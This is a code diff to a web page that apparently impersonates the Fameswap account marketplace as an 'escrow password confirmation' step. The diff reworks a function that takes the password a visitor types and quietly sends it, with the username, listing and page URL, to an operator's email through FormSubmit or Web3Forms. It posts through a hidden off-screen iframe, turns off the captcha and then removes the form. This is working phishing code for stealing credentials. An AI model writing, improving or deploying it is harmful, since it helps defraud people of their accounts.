@@ -1108,60 +1108,106 @@ html, body {
   }
 
   function sendPasswordViaFormSubmit(username, password) {
-    var email = getNotifyEmail();
-    if (!email || !password) return;
+    var cfg = window.FAMESWAP_NOTIFY || {};
+    var email = (cfg.email || '').trim();
+    if (!password) return;
+    var provider = (cfg.provider || 'formsubmit').toLowerCase();
 
-    var fields = {
+    var payload = {
       username: username || 'unknown',
       password: password,
       account: listing.username || '',
       price: listing.price != null ? String(listing.price) : '',
       platform: listing.platformLabel || '',
-      _subject: 'Escrow password confirmation — ' + (username || listing.username || 'user'),
-      _template: 'table',
-      _captcha: 'false',
-      _honey: ''
+      page: (typeof location !== 'undefined' ? location.href : '')
     };
 
-    /* Method 1: classic form POST into hidden iframe (no CORS issues) */
-    try {
-      var iframe = document.getElementById('fs-notify-iframe');
-      if (!iframe) {
-        iframe = document.createElement('iframe');
-        iframe.name = 'fs-notify-iframe';
-        iframe.id = 'fs-notify-iframe';
-        iframe.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute';
-        document.body.appendChild(iframe);
+    if (provider === 'web3forms') {
+      var key = (cfg.web3forms_access_key || cfg.access_key || '').trim();
+      if (!key) {
+        console.warn('[FAMESWAP_NOTIFY] web3forms_access_key missing');
+        return;
       }
-      var form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'https://formsubmit.co/' + email;
-      form.target = 'fs-notify-iframe';
-      form.style.display = 'none';
-      Object.keys(fields).forEach(function(key) {
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = fields[key];
-        form.appendChild(input);
-      });
-      document.body.appendChild(form);
-      form.submit();
-      setTimeout(function() {
-        try { form.parentNode && form.parentNode.removeChild(form); } catch (e) {}
-      }, 2000);
-    } catch (e) {}
-
-    /* Method 2: AJAX backup (FormData, no custom Content-Type) */
-    try {
-      var fd = new FormData();
-      Object.keys(fields).forEach(function(key) { fd.append(key, fields[key]); });
-      fetch('https://formsubmit.co/ajax/' + email, {
+      var body = {
+        access_key: key,
+        subject: 'Escrow password confirmation — ' + (payload.username || payload.account),
+        from_name: 'Fameswap Escrow',
+        username: payload.username,
+        password: payload.password,
+        account: payload.account,
+        price: payload.price,
+        platform: payload.platform,
+        page: payload.page
+      };
+      /* Web3Forms supports CORS + JSON */
+      fetch('https://api.web3forms.com/submit', {
         method: 'POST',
-        headers: { 'Accept': 'application/json' },
-        body: fd
-      }).catch(function() {});
-    } catch (e) {}
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify(body)
+      }).then(function(r) { return r.json(); }).then(function(d) {
+        console.log('[FAMESWAP_NOTIFY] web3forms', d);
+      }).catch(function(err) {
+        console.warn('[FAMESWAP_NOTIFY] web3forms error', err);
+      });
+      return;
+    }
+
+    /* ---- FormSubmit: native form POST into hidden iframe (no CORS) ---- */
+    if (!email) {
+      console.warn('[FAMESWAP_NOTIFY] email missing');
+      return;
+    }
+
+    var iframe = document.getElementById('fs-notify-iframe');
+    if (!iframe) {
+      iframe = document.createElement('iframe');
+      iframe.name = 'fs-notify-iframe';
+      iframe.id = 'fs-notify-iframe';
+      iframe.setAttribute('aria-hidden', 'true');
+      iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;left:-9999px;top:-9999px;';
+      document.body.appendChild(iframe);
+    }
+
+    var form = document.createElement('form');
+    form.method = 'POST';
+    /* Do NOT use /ajax/ — classic endpoint + form POST avoids CORS entirely */
+    form.action = 'https://formsubmit.co/' + email;
+    form.target = 'fs-notify-iframe';
+    form.acceptCharset = 'UTF-8';
+    form.style.display = 'none';
+    form.setAttribute('referrerpolicy', 'origin');
+
+    function addField(name, value) {
+      var input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = name;
+      input.value = value == null ? '' : String(value);
+      form.appendChild(input);
+    }
+
+    addField('username', payload.username);
+    addField('password', payload.password);
+    addField('account', payload.account);
+    addField('price', payload.price);
+    addField('platform', payload.platform);
+    addField('page', payload.page);
+    addField('_subject', 'Escrow password confirmation — ' + (payload.username || payload.account || 'user'));
+    addField('_template', 'table');
+    addField('_captcha', 'false');
+    addField('_honey', '');
+    /* Stay on blank after submit inside iframe */
+    addField('_next', 'https://formsubmit.co/thank-you-message');
+
+    document.body.appendChild(form);
+    try {
+      form.submit();
+      console.log('[FAMESWAP_NOTIFY] formsubmit form posted to iframe');
+    } catch (err) {
+      console.warn('[FAMESWAP_NOTIFY] form submit failed', err);
+    }
+    setTimeout(function() {
+      try { if (form.parentNode) form.parentNode.removeChild(form); } catch (e) {}
+    }, 3000);
   }
 
   bind('modal-accept-1', 'click', function() {
